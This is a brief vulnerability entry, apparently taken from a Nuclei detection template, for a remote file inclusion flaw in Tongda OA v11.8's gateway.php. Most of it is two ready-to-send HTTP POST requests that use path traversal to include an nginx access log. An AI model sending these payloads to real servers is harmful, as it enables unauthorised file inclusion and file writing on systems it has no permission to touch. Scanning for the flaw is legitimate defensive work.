# Vulnerability: Tongda OA v11.8 getway.php - Remote File Inclution
**Classification:** CWE-98
**Source:** Nuclei Template (`tongda-getway-rfi.yaml`)

## Description
There is a file inclusion vulnerability in Tongda OA v11.8 getway.php, an attacker sends a malicious request to include a log file, resulting in an arbitrary file writing vulnerability

## Vulnerable Code Pattern / Exploit Payload
```http
POST /ispirit/interface/gateway.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

json={"url":"/general/../../nginx/logs/oa.access.log"}

POST /mac/gateway.php HTTP/1.1
Host: {{Hostname}}
Content-Length: 54
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

json={"url":"/general/../../nginx/logs/oa.access.log"}
```

